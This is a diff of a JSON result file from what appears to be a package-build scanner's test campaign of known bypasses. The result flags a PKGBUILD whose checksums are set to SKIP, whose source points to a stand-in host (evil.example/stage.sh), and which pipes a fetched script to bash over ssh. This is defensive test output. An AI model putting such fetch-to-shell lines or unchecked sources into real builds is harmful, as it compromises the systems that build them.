@@ -5,7 +5,7 @@
   "diff_sha256": "sha256:d8ea0ad92d3ed31fbb17ddcd60584562366c22c41cd0591f39b6c0d90cae3c25",
   "environment_ref": "campaign.yml#environment",
   "generator": {
-    "directory": "campaigns/known-bypasses-manual/manual",
+    "directory": "/home/eclipse/Documents/GitHub/TrustSight/trustsight-harness/campaigns/known-bypasses-manual/manual",
     "inputs": 8,
     "type": "manual"
   },
@@ -41,21 +41,29 @@
   },
   "status": "detected",
   "trustsight": {
-    "config_fingerprint": "sha256:a7343821bc34603c5b4b048e213725d72a44fe0a5c92fd6d8c92e3f66aec0e8f",
+    "config_fingerprint": "sha256:873602644c2b4e25ade83a64343e6a338f7dfc0ebf67a9bc3f92c25beb317148",
     "report": {
+      "cached": false,
+      "cached_at": "",
       "changes": [
         "checksums changed from sha256 to SKIP",
         "source host changed: evil.example"
       ],
-      "config_fingerprint": "sha256:a7343821bc34603c5b4b048e213725d72a44fe0a5c92fd6d8c92e3f66aec0e8f",
+      "config_fingerprint": "sha256:873602644c2b4e25ade83a64343e6a338f7dfc0ebf67a9bc3f92c25beb317148",
       "coverage_gaps": [
         "tree_not_analyzed"
       ],
+      "coverage_gaps_carried": [],
       "dependencies": [],
       "depth_truncated": false,
       "diff_truncated": false,
       "failed": false,
-      "file_changes": [],
+      "file_changes": [
+        {
+          "path": "PKGBUILD",
+          "status": "modified"
+        }
+      ],
       "findings": [
         {
           "description": "checksum set to SKIP [H001]",
@@ -64,7 +72,7 @@
             "skip_suffix": ""
           },
           "file": "PKGBUILD",
-          "line": 15,
+          "line": 18,
           "rule_id": "H001",
           "severity": "HIGH",
           "template": "checksum set to SKIP{skip_suffix}"
@@ -77,7 +85,7 @@
             "shape": "uncatalogued fetch to a shell"
           },
           "file": "PKGBUILD",
-          "line": 20,
+          "line": 23,
           "rule_id": "X009",
           "severity": "CRITICAL",
           "template": "Fetch Through An Uncatalogued Client: {match}"
@@ -96,7 +104,7 @@
       "flagged": true,
       "fully_vetted": false,
       "ioc_matches": [],
-      "is_trivial": true,
+      "is_trivial": false,
       "new_commit": "",
       "new_version": "1.0.0",
       "old_commit": "",
@@ -116,7 +124,7 @@
             "skip_suffix": ""
           },
           "file": "PKGBUILD",
-          "line": 15,
+          "line": 18,
           "params": {
             "skip_suffix": ""
           },
@@ -133,7 +141,7 @@
             "removed": "['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']"
           },
           "file": "PKGBUILD",
-          "line": 14,
+          "line": 17,
           "params": {
             "added": "['https://evil.example/stage.sh']",
             "removed": "['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']"
@@ -151,7 +159,7 @@
             "shape": "uncatalogued fetch to a shell"
           },
           "file": "PKGBUILD",
-          "line": 20,
+          "line": 23,
           "params": {
             "body": "ssh buildbox cat /srv/stage.sh | head -c 4000 | bash",
             "shape": "uncatalogued fetch to a shell"
@@ -222,9 +230,9 @@
         }
       ],
       "suppressed_rules": [],
-      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. added 1 source URL(s). Signals: Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | head -c 4000 | bash [X009]; checksum set to SKIP [H001]; Source URL classified as unknown (https://evil.example/stage.sh) [SOURCE_BUCKET]. Review the diff before building.",
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version unchanged. modified PKGBUILD; added 1 source URL(s). Signals: Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | head -c 4000 | bash [X009]; checksum set to SKIP [H001]; Source URL classified as unknown (https://evil.example/stage.sh) [SOURCE_BUCKET]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 829
+    "wall_clock_ms": 854
   }
 }
